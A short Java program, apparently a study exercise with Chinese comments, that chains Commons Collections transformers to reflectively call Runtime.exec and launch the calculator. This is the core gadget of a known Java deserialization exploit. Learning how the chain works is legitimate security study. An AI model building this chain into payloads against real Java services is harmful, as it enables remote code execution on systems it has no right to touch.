import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class chainedTrans {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                // 获得Runtime类对象
                new ConstantTransformer(Runtime.class),
                // 传入Runtime类对象 反射执行getMethod获得getRuntime方法
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}
                        ),
                // 传入getRuntime方法对象 反射执行invoke方法 得到Runtime实例
                new InvokerTransformer("invoke",
                        new Class[] {Object.class, Object[].class },
                        new Object[] {null, null }
                        ),
                // 传入Runtime实例 执行exec方法
                new InvokerTransformer("exec",
                        new Class[] {String.class },
                        new Object[] {"Calc.exe"})
        };
//        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(null);
    }
}
